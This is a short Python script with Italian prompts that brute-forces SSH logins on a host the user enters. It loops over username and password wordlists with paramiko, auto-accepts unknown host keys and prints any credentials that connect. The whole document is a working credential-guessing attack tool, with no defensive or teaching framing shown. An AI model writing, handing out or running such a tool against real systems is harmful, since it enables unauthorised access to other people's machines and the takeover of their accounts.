import paramiko

hostname = input("inserire Ip da attaccare: ")
port = int(input("inserire la porta SSH (default:22)"))

username_file = open('username.txt')
password_file = open('password.txt')

username = username_file.readlines()
password = password_file.readlines()

if(port==""):
    port =22

for user in username:
    user = user.rstrip()
    for passw in password:
        passw = passw.rstrip()

        try:
            print("trayng..", user, passw , "at port:" , port)
            client =paramiko.SSHClient()
            client.load_system_host_keys()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname, port , username = user, password=passw)
            print(f"Connesso a {hostname}")
            client.close()
            print("username: ",user , "password: " ,passw )
        except Exception as err:
            print(f"Errore nella connessione SSH: {err}")
